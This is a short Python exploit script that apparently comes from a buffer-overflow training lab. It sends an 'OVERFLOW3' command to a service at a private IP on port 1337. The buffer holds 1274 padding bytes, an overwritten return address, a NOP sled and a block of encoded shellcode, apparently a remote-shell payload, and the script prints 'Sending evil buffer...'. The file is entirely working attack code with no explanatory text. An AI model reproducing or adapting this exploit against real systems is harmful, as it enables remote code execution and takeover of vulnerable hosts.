#!/usr/bin/env python3
import socket

ip = "10.10.80.211"
port = 1337

prefix = "OVERFLOW3 "
offset = 1274
overflow = "A" * offset
retn = "\x03\x12\x50\x62"
padding = "\x90" * 16
payload = ("\xfc\xbb\x1f\xd5\xc7\xa3\xeb\x0c\x5e\x56\x31\x1e\xad\x01"
"\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xe3\x3d\x45"
"\xa3\x1b\xbe\x2a\x2d\xfe\x8f\x6a\x49\x8b\xa0\x5a\x19\xd9"
"\x4c\x10\x4f\xc9\xc7\x54\x58\xfe\x60\xd2\xbe\x31\x70\x4f"
"\x82\x50\xf2\x92\xd7\xb2\xcb\x5c\x2a\xb3\x0c\x80\xc7\xe1"
"\xc5\xce\x7a\x15\x61\x9a\x46\x9e\x39\x0a\xcf\x43\x89\x2d"
"\xfe\xd2\x81\x77\x20\xd5\x46\x0c\x69\xcd\x8b\x29\x23\x66"
"\x7f\xc5\xb2\xae\xb1\x26\x18\x8f\x7d\xd5\x60\xc8\xba\x06"
"\x17\x20\xb9\xbb\x20\xf7\xc3\x67\xa4\xe3\x64\xe3\x1e\xcf"
"\x95\x20\xf8\x84\x9a\x8d\x8e\xc2\xbe\x10\x42\x79\xba\x99"
"\x65\xad\x4a\xd9\x41\x69\x16\xb9\xe8\x28\xf2\x6c\x14\x2a"
"\x5d\xd0\xb0\x21\x70\x05\xc9\x68\x1d\xea\xe0\x92\xdd\x64"
"\x72\xe1\xef\x2b\x28\x6d\x5c\xa3\xf6\x6a\xa3\x9e\x4f\xe4"
"\x5a\x21\xb0\x2d\x99\x75\xe0\x45\x08\xf6\x6b\x95\xb5\x23"
"\x3b\xc5\x19\x9c\xfc\xb5\xd9\x4c\x95\xdf\xd5\xb3\x85\xe0"
"\x3f\xdc\x2c\x1b\xa8\xe9\xb6\x34\x29\x86\xb4\x3a\x38\x0a"
"\x30\xdc\x50\xa2\x14\x77\xcd\x5b\x3d\x03\x6c\xa3\xeb\x6e"
"\xae\x2f\x18\x8f\x61\xd8\x55\x83\x16\x28\x20\xf9\xb1\x37"
"\x9e\x95\x5e\xa5\x45\x65\x28\xd6\xd1\x32\x7d\x28\x28\xd6"
"\x93\x13\x82\xc4\x69\xc5\xed\x4c\xb6\x36\xf3\x4d\x3b\x02"
"\xd7\x5d\x85\x8b\x53\x09\x59\xda\x0d\xe7\x1f\xb4\xff\x51"
"\xf6\x6b\x56\x35\x8f\x47\x69\x43\x90\x8d\x1f\xab\x21\x78"
"\x66\xd4\x8e\xec\x6e\xad\xf2\x8c\x91\x64\xb7\xad\x73\xac"
"\xc2\x45\x2a\x25\x6f\x08\xcd\x90\xac\x35\x4e\x10\x4d\xc2"
"\x4e\x51\x48\x8e\xc8\x8a\x20\x9f\xbc\xac\x97\xa0\x94\xac"
"\x17\x5f\x17")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
